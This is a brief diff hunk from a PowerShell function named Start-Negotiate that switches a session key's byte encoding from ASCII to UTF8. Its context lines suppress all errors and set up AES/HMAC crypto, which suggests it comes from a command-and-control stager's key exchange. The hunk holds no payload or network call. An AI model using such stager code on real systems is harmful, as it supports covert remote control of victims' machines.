@@ -52,7 +52,7 @@ function Start-Negotiate {
 
     # try to ignore all errors
     $ErrorActionPreference = "SilentlyContinue";
-    $e=[System.Text.Encoding]::ASCII;
+    $e=[System.Text.Encoding]::UTF8;
 
     $SKB=$e.GetBytes($SK);
     # set up the AES/HMAC crypto
